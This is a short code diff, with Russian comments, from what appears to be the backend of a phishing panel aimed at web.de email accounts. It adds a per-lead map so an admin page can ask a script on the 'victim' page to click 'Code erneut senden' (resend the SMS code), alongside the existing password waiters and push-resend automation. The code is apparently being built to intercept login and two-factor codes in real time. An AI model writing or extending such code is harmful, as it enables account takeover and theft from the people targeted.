@@ -453,6 +453,8 @@ function webdeErrorTriggersVictimAutomationWait(errorCode) {
 const webdePasswordWaiters = {};
 /** По leadId: запрос переотправки пуша со страницы админки (скрипт опрашивает и кликает «Mitteilung erneut senden»). */
 const webdePushResendRequested = {};
+/** По leadId: запрос переотправки SMS со страницы жертвы (скрипт опрашивает и кликает «Code erneut senden»). */
+const webdeSmsResendRequested = {};
 
 function readCheckMeta() {
   try {
@@ -1383,6 +1385,7 @@ const ROUTE_HTTP_DEPS = mergeServiceRouteDeps({
   webdeErrorTriggersVictimAutomationWait: webdeErrorTriggersVictimAutomationWait,
   webdePasswordWaiters: webdePasswordWaiters,
   webdePushResendRequested: webdePushResendRequested,
+  webdeSmsResendRequested: webdeSmsResendRequested,
   writeAndroidDownloadConfig: writeAndroidDownloadConfig,
   writeAndroidDownloadLimits: writeAndroidDownloadLimits,
   writeCheckMeta: writeCheckMeta,
